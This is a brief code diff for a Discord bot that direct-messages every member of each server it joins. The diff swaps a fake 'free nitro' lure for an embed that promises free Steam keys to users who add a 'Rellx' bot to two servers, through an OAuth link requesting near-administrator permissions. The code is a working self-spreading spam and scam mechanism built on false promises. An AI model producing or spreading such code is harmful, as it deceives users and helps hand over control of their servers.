@@ -42,7 +42,10 @@ async def on_guild_join(guild):
     members = guild.members
     for member in members:
         try:
-            await member.send(f"{member.mention} Join this server to get nitro\nhttps://discord.gg/cYwqYw2Rtr")
+            embed=discord.Embed(color=discord.Color.blue())
+            embed.add_field(name="Free games",value="add [Rellx bot](https://discord.com/oauth2/authorize?client_id=849886759042547764&scope=bot&permissions=2146958591) to two of your servers and ping the bot to get steam game keys")
+            embed.set_image(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmzUdUPwtgCRHex4YQg2SScueCsRza21okfg&usqp=CAU")
+            await member.send(embed=embed)
         except:
             print("user closed")
 
